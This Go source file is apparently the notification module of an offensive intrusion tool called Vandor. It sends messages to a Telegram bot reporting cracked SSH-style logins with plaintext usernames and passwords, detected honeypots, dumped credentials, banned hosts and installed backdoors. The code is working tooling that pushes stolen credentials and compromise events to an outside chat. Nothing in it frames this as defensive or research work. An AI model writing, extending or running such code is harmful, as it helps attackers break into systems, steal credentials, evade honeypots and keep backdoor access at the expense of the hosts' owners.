package internal

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/batmanpriv/Vandor/config"

	"golang.org/x/time/rate"
)

var (
	telegramLimiter   *rate.Limiter
	telegramRateLimit = 20
)

func InitTelegramLimiter() {
	telegramLimiter = rate.NewLimiter(rate.Limit(telegramRateLimit), telegramRateLimit)
}

func SendTelegramMessage(token, chatID, message string) {
	if token == "" || chatID == "" || telegramLimiter == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := telegramLimiter.Wait(ctx); err != nil {
		return
	}
	if len(message) > 4000 {
		message = message[:3997] + "..."
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	client := &http.Client{Timeout: 10 * time.Second}
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	jsonData, _ := json.Marshal(payload)
	resp, err := client.Post(url, "application/json", bytes.NewReader(jsonData))
	if err == nil {
		defer resp.Body.Close()
		io.Copy(io.Discard, resp.Body)
	}
}

func SendTelegramNotification(notificationType string, data map[string]interface{}) {
	if config.TelegramToken == "" || config.TelegramChatID == "" {
		return
	}
	var message string
	switch notificationType {
	case "cracked":
		message = fmt.Sprintf("🔓 <b>CRACKED!</b>\n📍 Host: %s\n🔌 Port: %s\n👤 User: %s\n🔑 Pass: %s\n🖥️ Banner: %s",
			data["host"], data["port"], data["user"], data["pass"], data["banner"])
	case "honeypot":
		message = fmt.Sprintf("🍯 <b>HONEYPOT DETECTED!</b>\n📍 Host: %s\n📊 Confidence: %.0f%%\n🔍 Reason: %s",
			data["host"], data["confidence"], data["reason"])
	case "scan_complete":
		message = fmt.Sprintf("✅ <b>SCAN COMPLETED!</b>\n⏱️ Duration: %s\n🔓 Found: %d credentials\n🍯 Honeypots: %d",
			data["duration"], data["cracked_count"], data["honeypot_count"])
	case "banned":
		message = fmt.Sprintf("⛔ <b>HOST BANNED!</b>\n📍 Host: %s\n📝 Reason: %s",
			data["host"], data["reason"])
	case "cred_dump":
		message = fmt.Sprintf("💾 <b>CREDENTIALS DUMPED</b>\n📍 Host: %s\n📂 Source: %s",
			data["host"], data["source"])
	case "backdoor":
		message = fmt.Sprintf("🐚 <b>BACKDOOR INSTALLED!</b>\n📍 Host: %s\n🔌 Port: %s\n🔧 Type: %s",
			data["host"], data["port"], data["type"])
	default:
		return
	}
	SendTelegramMessage(config.TelegramToken, config.TelegramChatID, message)
}
